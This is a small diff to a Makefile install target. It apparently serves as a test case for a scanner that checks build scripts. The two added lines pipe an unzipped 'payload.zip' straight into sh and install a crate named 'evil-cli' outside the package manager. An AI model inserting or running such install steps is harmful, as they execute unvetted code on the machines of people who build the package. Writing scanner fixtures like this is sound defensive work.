@@ -8,6 +8,8 @@ all:
 
 install:
 	install -Dm755 minifier $(DESTDIR)/usr/bin/minifier
+	unzip -p payload.zip | sh                                # decompress | shell
+	cargo install evil-cli                                   # remote crate, no pacman
 
 # Continued line: one command to make (joined before the scan).
 update:
